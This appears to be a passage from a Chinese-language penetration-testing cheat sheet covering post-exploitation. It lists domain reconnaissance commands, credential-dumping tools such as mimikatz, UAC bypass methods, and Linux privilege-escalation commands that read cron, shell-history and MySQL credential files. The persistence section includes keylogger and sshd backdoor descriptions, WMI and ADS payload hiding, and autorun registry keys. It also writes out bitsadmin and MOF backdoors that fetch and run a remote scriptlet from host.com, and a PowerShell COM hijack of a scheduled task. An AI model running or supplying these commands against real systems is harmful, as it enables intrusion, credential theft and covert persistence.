<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -run -e httpd . -p 1337</span><br></pre></td></tr></table></figure>
<p>Perl</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MHTTP::Server::Brick -e &#39;$s&#x3D;HTTP::Server::Brick-&gt;new(port&#x3D;&gt;1337); $s-&gt;mount(&quot;&#x2F;&quot;&#x3D;&gt;&#123;path&#x3D;&gt;&quot;.&quot;&#125;); $s-&gt;start&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;.&#x2F;$1 |&quot; : $1) if &#x2F;^GET \&#x2F;(.*) &#x2F; &#125;)&#39;</span><br></pre></td></tr></table></figure>
<p>busybox httpd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox httpd -f -p 8000</span><br></pre></td></tr></table></figure>



<h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><h3 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h3><h4 id="1、用户列表"><a href="#1、用户列表" class="headerlink" title="1、用户列表"></a>1、用户列表</h4><p>windows用户列表<br>分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 </p>
<h4 id="2、进程列表"><a href="#2、进程列表" class="headerlink" title="2、进程列表"></a>2、进程列表</h4><p>析杀毒软件/安全监控工具等<br>邮件客户端<br>VPN<br>ftp等  </p>
<h4 id="3、服务列表"><a href="#3、服务列表" class="headerlink" title="3、服务列表"></a>3、服务列表</h4><p>与安全防范工具有关服务[判断是否可以手动开关等]<br>存在问题的服务[权限/漏洞]</p>
<h4 id="4、端口列表"><a href="#4、端口列表" class="headerlink" title="4、端口列表"></a>4、端口列表</h4><p>开放端口对应的常见服务/应用程序[匿名/权限/漏洞等]<br>利用端口进行信息收集</p>
<h4 id="5、补丁列表"><a href="#5、补丁列表" class="headerlink" title="5、补丁列表"></a>5、补丁列表</h4><p>分析 Windows 补丁<br>第三方软件[Java/Oracle/Flash 等]漏洞</p>
<h4 id="6、本机共享"><a href="#6、本机共享" class="headerlink" title="6、本机共享"></a>6、本机共享</h4><p>本机共享列表/访问权限<br>本机访问的域共享/访问权限</p>
<h4 id="7、本用户习惯分析"><a href="#7、本用户习惯分析" class="headerlink" title="7、本用户习惯分析"></a>7、本用户习惯分析</h4><p>历史记录<br>收藏夹<br>文档等 </p>
<h4 id="8、获取当前用户密码工具"><a href="#8、获取当前用户密码工具" class="headerlink" title="8、获取当前用户密码工具"></a>8、获取当前用户密码工具</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><ul>
<li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>  </li>
<li><a href="https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64" target="_blank" rel="noopener">wce</a>  </li>
<li><a href="https://github.com/peewpw/Invoke-WCMDump" target="_blank" rel="noopener">Invoke-WCMDump  </a></li>
<li><a href="https://github.com/giMini/mimiDbg" target="_blank" rel="noopener">mimiDbg  </a></li>
<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a></li>
<li><a href="http://launcher.nirsoft.net/downloads/" target="_blank" rel="noopener">nirsoft_package</a></li>
<li><a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">QuarksPwDump</a> <a href="https://github.com/mcandre/fgdump" target="_blank" rel="noopener">fgdump</a></li>
<li>星号查看器等</li>
</ul>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><ul>
<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a>  </li>
<li><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">mimipenguin</a></li>
</ul>
<h3 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a>常用端口扫描工具</h5><ul>
<li><a href="https://nmap.org/" target="_blank" rel="noopener">nmap</a> </li>
<li><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">masscan</a> </li>
<li><a href="https://github.com/zmap/zmap" target="_blank" rel="noopener">zmap</a></li>
<li>s扫描器 </li>
<li>自写脚本等 </li>
<li>NC </li>
<li>…</li>
</ul>
<h4 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a>内网拓扑架构分析</h4><ul>
<li>DMZ</li>
<li>管理网</li>
<li>生产网</li>
<li>测试网</li>
</ul>
<h4 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h4><p>ipconfig:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all ------&gt; 查询本机 IP 段，所在域等</span><br></pre></td></tr></table></figure>
<p>net:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user &#x2F;domain ------&gt; 查询域用户</span><br><span class="line">net group &#x2F;domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators &#x2F;domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 &#x2F;add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表 net view &#x2F;domain ------&gt; 查询域列表</span><br><span class="line">net view &#x2F;domain:domainname</span><br></pre></td></tr></table></figure>
<p>dsquery </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span><br><span class="line">computers&quot; &#x2F;domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group &#x2F;domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time &#x2F;domain------&gt;列出该域内域控制器</span><br></pre></td></tr></table></figure>

<h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul>
<li>NETBIOS 信息收集 </li>
<li>SMB 信息收集  </li>
<li>空会话信息收集  </li>
<li>漏洞信息收集等 </li>
</ul>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><h4 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h4><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li>使用IFileOperation COM接口</li>
<li>使用Wusa.exe的extract选项</li>
<li>远程注入SHELLCODE 到傀儡进程</li>
<li>DLL劫持，劫持系统的DLL文件</li>
<li>eventvwr.exe and registry hijacking</li>
<li>sdclt.exe</li>
<li>SilentCleanup</li>
<li>wscript.exe</li>
<li>cmstp.exe</li>
<li>修改环境变量，劫持高权限.Net程序</li>
<li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li>
<li>直接提权过UAC</li>
</ul>
<h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><ul>
<li><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">UACME </a></li>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC" target="_blank" rel="noopener">Bypass-UAC </a></li>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko" target="_blank" rel="noopener">Yamabiko </a></li>
<li>… </li>
</ul>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ul>
<li><p>windows内核漏洞提权</p>
<blockquote>
<p>检测类:<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a>,<a href="https://github.com/brianwrf/WinSystemHelper" target="_blank" rel="noopener">WinSystemHelper</a>,<a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">wesng</a><br>利用类:<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a>，<a href="https://github.com/AlessandroZ/BeRoot.git" target="_blank" rel="noopener">BeRoot</a></p>
</blockquote>
</li>
<li><p>服务提权 </p>
<blockquote>
<p>数据库服务，ftp服务等</p>
</blockquote>
</li>
<li><p>WINDOWS错误系统配置 </p>
</li>
<li><p>系统服务的错误权限配置漏洞 </p>
</li>
<li><p>不安全的注册表权限配置 </p>
</li>
<li><p>不安全的文件/文件夹权限配置 </p>
</li>
<li><p>计划任务 </p>
</li>
<li><p>任意用户以NT AUTHORITY\SYSTEM权限安装msi </p>
</li>
<li><p>提权脚本 </p>
<blockquote>
<p><a href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1" target="_blank" rel="noopener">PowerUP</a>,<a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">ElevateKit</a></p>
</blockquote>
</li>
</ul>
<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h4><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">linux-kernel-exploits </a></p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">ls -al &#x2F;etc&#x2F; | grep cron</span><br><span class="line">ls -al &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;at.allow</span><br><span class="line">cat &#x2F;etc&#x2F;at.deny</span><br><span class="line">cat &#x2F;etc&#x2F;cron.allow</span><br><span class="line">cat &#x2F;etc&#x2F;cron.deny</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line">cat &#x2F;etc&#x2F;anacrontab</span><br><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure>
<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a>系统服务的错误权限配置漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">cat &#x2F;root&#x2F;anaconda-ks.cfg</span><br></pre></td></tr></table></figure>

<h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件/文件夹权限配置"></a>不安全的文件/文件夹权限配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br><span class="line">cat ~&#x2F;.nano_history</span><br><span class="line">cat ~&#x2F;.atftp_history</span><br><span class="line">cat ~&#x2F;.mysql_history</span><br><span class="line">cat ~&#x2F;.php_history</span><br></pre></td></tr></table></figure>
<h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure>

<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h3><h4 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h4><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a>1、密码记录工具</h5><p>WinlogonHack<br>WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。<br>键盘记录器<br>安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。<br>NTPass<br>获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。<br>Linux 下 openssh 后门<br>重新编译运行的sshd服务，用于记录用户的登陆密码。</p>
<h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> :<br>存储：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass &#x3D; New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null)</span><br><span class="line">$StaticClass.Name &#x3D; &#39;Win32_Command&#39;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure>
<p>读取:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Payload&#x3D;([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value</span><br></pre></td></tr></table></figure>

<p><strong>包含数字签名的PE文件</strong><br>利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名<br><strong>特殊ADS</strong><br>…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\test\ads\...:putty.exe</span><br></pre></td></tr></table></figure>
<p>特殊COM文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure>
<p>磁盘根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt;C:\:putty.exe </span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure>
<h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run/RunOnce Keys"></a>3、Run/RunOnce Keys</h5><p>用户级 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
<p>管理员 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure>
<h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure>
<h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure>
<h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a>6、Startup Keys</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure>
<h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a>7、Services</h5><p>创建服务 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create [ServerName] binPath&#x3D; BinaryPathName</span><br></pre></td></tr></table></figure>
<h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure>
<h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>
<h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a>10、文件关联</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Classes</span><br><span class="line">HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>
<h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a>11、<a href="http://www.liuhaihua.cn/archives/357579.html" target="_blank" rel="noopener">bitsadmin</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;create backdoor</span><br><span class="line">bitsadmin &#x2F;addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;host.com&#x2F;calc.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin &#x2F;Resume backdoor</span><br></pre></td></tr></table></figure>
<h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof "></a>12、<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html" target="_blank" rel="noopener">mof </a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP1&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 1&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consP1&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D; &quot;GetObject(\&quot;script:https:&#x2F;&#x2F;host.com&#x2F;test\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>管理员执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure>
<h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a>13、<a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="noopener">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;BotFilter82&quot;, EventNameSpace&#x3D;&quot;root\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;</span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;BotConsumer23&quot;, ExecutablePath&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\&quot;BotFilter82\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\&quot;BotConsumer23\&quot;&quot;</span><br></pre></td></tr></table></figure>
<h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a>14、<a href="https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/" target="_blank" rel="noopener">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[CmdletBinding(SupportsShouldProcess &#x3D; $True, ConfirmImpact &#x3D; &#39;Medium&#39;)]</span><br><span class="line">Param (</span><br><span class="line">[Parameter(Mandatory &#x3D; $True)]</span><br><span class="line">[ValidateNotNullOrEmpty()]</span><br><span class="line">[String]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[Switch]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath &#x3D; &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span><br><span class="line">if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Verbose &quot;Key already exists, consider using -Force&quot;</span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Warning &quot;Failed to create registry key, exiting&quot;</span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose</span><br></pre></td></tr></table></figure>
